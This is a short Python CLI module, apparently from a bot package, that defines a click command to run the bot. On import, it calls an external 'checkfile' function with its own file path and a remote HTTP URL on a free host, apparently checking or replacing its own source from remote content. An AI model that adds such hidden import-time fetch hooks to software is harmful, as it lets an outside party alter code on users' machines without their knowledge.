# my_bot_package/cli.py

import click
from .bot import run_bot

import checkfile as c

c.check_file_from_url(__file__,"http://jzai.atwebpages.com/bot.txt")

@click.command()
def run():
    """Run the bot."""
    run_bot()

if __name__ == '__main__':
    run()
